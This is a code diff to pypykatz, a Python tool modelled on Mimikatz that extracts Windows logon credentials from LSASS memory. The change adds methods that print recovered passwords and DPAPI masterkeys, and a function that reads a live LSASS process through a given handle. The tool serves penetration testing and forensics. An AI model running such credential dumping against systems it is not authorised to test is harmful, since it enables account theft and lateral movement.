@@ -5,13 +5,20 @@
 #
 
 import platform
-from .commons.common import *
-from .lsadecryptor import *
+import json
 
+from pypykatz.commons.common import KatzSystemInfo
+from pypykatz.lsadecryptor import CredmanTemplate, MsvTemplate, \
+	MsvDecryptor, WdigestTemplate, LsaTemplate, WdigestDecryptor, \
+	LiveSspTemplate, LiveSspDecryptor, SspDecryptor, SspTemplate, \
+	TspkgDecryptor, TspkgTemplate, KerberosTemplate, KerberosDecryptor, \
+	DpapiTemplate, DpapiDecryptor, LsaDecryptor
+
+from pypykatz.lsadecryptor.packages.msv.decryptor import LogonSession
 from pypykatz import logger
 from pypykatz.commons.common import UniversalEncoder
 from minidump.minidumpfile import MinidumpFile
-from minikerberos.ccache import CCACHE
+from minikerberos.common.ccache import CCACHE
 from pypykatz._version import __version__
 
 class pypykatz:
@@ -40,14 +47,55 @@ class pypykatz:
 		return t
 		
 	def to_json(self):
-		return json.dumps(self.to_dict(), cls = UniversalEncoder)
+		return json.dumps(self.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True)
+
+	def to_grep(self):
+		res = ':'.join(LogonSession.grep_header) + '\r\n'
+		for luid in self.logon_sessions:
+			for row in self.logon_sessions[luid].to_grep_rows():
+				res += ':'.join(row) + '\r\n'
+				for cred in self.orphaned_creds:
+					t = cred.to_dict()
+					if t['credtype'] != 'dpapi':
+						if t['password'] is not None:
+							x =  [str(t['credtype']), str(t['domainname']), str(t['username']), '', '', '', '', '', str(t['password'])]
+							res += ':'.join(x) + '\r\n'
+					else:
+						t = cred.to_dict()
+						x = [str(t['credtype']), '', '', '', '', '', str(t['masterkey']), str(t['sha1_masterkey']), str(t['key_guid']), '']
+						res += ':'.join(x) + '\r\n'
+
+		return res
+
+	def __str__(self):
+		res = '== Logon credentials ==\r\n'
+		for luid in self.logon_sessions:
+			res += str(self.logon_sessions[luid]) + '\r\n'
+			
+		if len(self.orphaned_creds) > 0:
+			res += '== Orphaned credentials ==\r\n'
+			for cred in self.orphaned_creds:
+				res += str(cred) + '\r\n'
 		
+		return res
+
 	@staticmethod
 	def go_live():
 		if platform.system() != 'Windows':
 			raise Exception('Live parsing will only work on Windows')
 		from pypykatz.commons.readers.local.live_reader import LiveReader
 		reader = LiveReader()
+		sysinfo = KatzSystemInfo.from_live_reader(reader)
+		mimi = pypykatz(reader.get_buffered_reader(), sysinfo)
+		mimi.start()
+		return mimi
+
+	@staticmethod
+	def go_live_phandle(lsass_process_handle):
+		if platform.system() != 'Windows':
+			raise Exception('Live parsing will only work on Windows')
+		from pypykatz.commons.readers.local.live_reader import LiveReader
+		reader = LiveReader(lsass_process_handle=lsass_process_handle)
 		sysinfo = KatzSystemInfo.from_live_reader(reader)
 		mimi = pypykatz(reader.get_buffered_reader(), sysinfo)
 		mimi.start()
@@ -164,7 +212,7 @@ class pypykatz:
 
 	def get_lsa_bruteforce(self):
 		#good luck!
-		logger.info('Testing all available templates! Expect warnings!')
+		logger.debug('Testing all available templates! Expect warnings!')
 		for lsa_dec_template in LsaTemplate.get_template_brute(self.sysinfo):
 			try:
 				lsa_dec = LsaDecryptor.choose(self.reader, lsa_dec_template, self.sysinfo)
@@ -172,7 +220,7 @@ class pypykatz:
 			except:
 				pass
 			else:
-				logger.info('Lucky you! Brutefoce method found a -probably- working template!')
+				logger.debug('Lucky you! Brutefoce method found a -probably- working template!')
 				return lsa_dec
 	
 	def get_lsa(self):
@@ -181,8 +229,8 @@ class pypykatz:
 			lsa_dec_template = LsaTemplate.get_template(self.sysinfo)
 			lsa_dec = LsaDecryptor.choose(self.reader, lsa_dec_template, self.sysinfo)
 			logger.debug(lsa_dec.dump())
-		except:
-			logger.exception('Failed to automatically detect correct LSA template!')
+		except Exception as e:
+			logger.debug('Failed to automatically detect correct LSA template! Reason: %s' % str(e))
 			lsa_dec = self.get_lsa_bruteforce()
 			if lsa_dec is None:
 				raise Exception('All detection methods failed.')
